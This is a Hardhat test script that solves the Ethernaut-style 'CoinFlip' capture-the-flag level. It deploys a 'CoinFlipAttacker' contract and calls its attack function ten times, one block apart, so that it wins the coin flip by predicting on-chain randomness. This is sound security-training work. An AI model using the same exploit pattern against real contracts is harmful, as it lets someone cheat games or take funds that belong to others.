import { expect } from "chai";
import { Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, waitNextBlock } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`CoinFlip`);
  const challengeAddress = await createChallenge(
    `0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF`
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`CoinFlipAttacker`);
  attacker = await attackerFactory.deploy(challenge.target);
  await attacker.waitForDeployment();   // ✅ important
});

it("solves the challenge", async function () {
  // need to win 10 times
  for (let i = 0; i < 10; i++) {
    tx = await attacker.attack();
    await tx.wait();

    // simulate waiting 1 block
    await waitNextBlock(tx)
    console.log(await ethers.provider.getBlockNumber());
  }
});

after(async () => {
  expect(await submitLevel(challenge.target as string), "level not solved").to.be.true;
});
